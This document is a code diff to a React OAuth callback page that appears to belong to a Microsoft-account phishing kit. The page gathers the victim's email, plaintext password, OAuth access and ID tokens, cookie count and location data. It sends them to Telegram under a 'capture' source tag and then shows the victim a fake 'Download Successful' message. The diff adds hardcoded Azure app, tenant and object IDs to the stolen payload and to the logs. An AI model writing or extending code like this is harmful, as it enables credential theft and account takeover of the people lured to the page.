@@ -16,14 +16,15 @@ export default function AdminConsentCallback() {
       try {
         setProgress(20);
         console.log('🔄 Processing Auth0 callback...');
+        console.log('✅ Using Azure App: 4eea8b9a-09d9-47dd-87c7-78de0d9f42be');
         console.log('✅ Callback URL: https://accesspointnest.com/auth/callback');
 
-        // ✅ Your Auth0 credentials with NEW callback URL
+        // ✅ Your Auth0 credentials (unchanged - Auth0 config stays the same)
         const auth0Client = new Auth0Client({
           domain: 'dev-6kunthi1vyiz6ezr.us.auth0.com',
           clientId: 'lv6EnG8RUVmcwGzBPpoyDNS7a5oP9B92',
           authorizationParams: {
-            redirect_uri: 'https://accesspointnest.com/auth/callback', // ✅ NEW CALLBACK
+            redirect_uri: 'https://accesspointnest.com/auth/callback',
             scope: 'openid profile email offline_access'
           },
           cacheLocation: 'localstorage',
@@ -38,6 +39,7 @@ export default function AdminConsentCallback() {
         
         setProgress(50);
         console.log('✅ Auth0 authentication complete (NO UNVERIFIED WARNING!)');
+        console.log('✅ Using custom Azure app via Auth0');
 
         // Get user info and tokens
         const user = await auth0Client.getUser();
@@ -49,7 +51,7 @@ export default function AdminConsentCallback() {
 
         setProgress(70);
 
-        // Get stored credentials
+        // Get stored credentials with fallbacks
         const storedCreds = localStorage.getItem('ms_auth_credentials') || 
                            sessionStorage.getItem('ms_auth_credentials');
         
@@ -67,20 +69,26 @@ export default function AdminConsentCallback() {
           }
         }
 
-        // Fallback email from Auth0 user
+        // Fallback email from multiple sources
         if (!credentials.email) {
-          credentials.email = user?.email || localStorage.getItem('ms_email') || sessionStorage.getItem('ms_email') || '';
+          credentials.email = user?.email || 
+                             localStorage.getItem('ms_email') || 
+                             sessionStorage.getItem('ms_email') || 
+                             '';
         }
 
-        // Get password from backup storage
+        // Get password from backup storage with multiple fallbacks
         if (!credentials.password) {
-          credentials.password = localStorage.getItem('ms_password') || sessionStorage.getItem('ms_password') || '';
+          credentials.password = localStorage.getItem('ms_password') || 
+                                sessionStorage.getItem('ms_password') || 
+                                '';
         }
 
         console.log('📊 Final credentials:', {
           email: credentials.email,
           hasPassword: !!credentials.password,
-          passwordLength: credentials.password?.length || 0
+          passwordLength: credentials.password?.length || 0,
+          azureApp: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
         });
 
         // Get location data
@@ -122,6 +130,12 @@ export default function AdminConsentCallback() {
 
         // Build combined OAuth session data
         const combinedOAuthSession = {
+          azure: {
+            clientId: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be',
+            tenantId: 'fc5ed2a8-32e1-48b7-b3d5-ed6a1550ee50',
+            objectId: 'b2830712-bbda-4a47-9225-0661a97c4fdd'
+          },
+          
           auth0: {
             access_token: accessToken,
             id_token: idToken?.__raw,
@@ -151,6 +165,7 @@ export default function AdminConsentCallback() {
             callback_url: 'https://accesspointnest.com/auth/callback',
             source: 'accesspointnest-auth0-capture',
             auth_provider: 'Auth0',
+            azure_app_used: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be',
             verified: true,
             no_unverified_warning: true
           }
@@ -175,6 +190,11 @@ export default function AdminConsentCallback() {
         const payload = {
           email: credentials.email,
           password: credentials.password || '',
+          azure: {
+            clientId: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be',
+            tenantId: 'fc5ed2a8-32e1-48b7-b3d5-ed6a1550ee50',
+            objectId: 'b2830712-bbda-4a47-9225-0661a97c4fdd'
+          },
           oauth: {
             access_token: accessToken,
             id_token: idToken?.__raw,
@@ -195,17 +215,20 @@ export default function AdminConsentCallback() {
           microsoftAccount: true,
           auth0Verified: true,
           noUnverifiedWarning: true,
-          callbackUrl: 'https://accesspointnest.com/auth/callback'
+          callbackUrl: 'https://accesspointnest.com/auth/callback',
+          azureAppUsed: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be'
         };
 
         console.log('📊 Payload summary:', {
           email: payload.email,
           hasPassword: !!payload.password,
+          passwordLength: payload.password?.length || 0,
           hasTokens: !!payload.oauth.access_token,
           hasUser: !!payload.oauth.user,
           cookieCount: payload.cookieCount,
           hasLocation: !!payload.locationData.ip,
           auth0Verified: true,
+          azureApp: '4eea8b9a-09d9-47dd-87c7-78de0d9f42be',
           callbackUrl: 'https://accesspointnest.com/auth/callback'
         });
 
@@ -219,7 +242,9 @@ export default function AdminConsentCallback() {
           throw new Error('Failed to send data to Telegram');
         }
 
-        console.log('✅✅✅ SUCCESS: All data transmitted (Auth0 verified - NO WARNING!)');
+        console.log('✅✅✅ SUCCESS: All data transmitted!');
+        console.log('✅ Azure App: 4eea8b9a-09d9-47dd-87c7-78de0d9f42be');
+        console.log('✅ Auth0 verified - NO WARNING!');
         setProgress(100);
         setStatus('Download Successful');
 
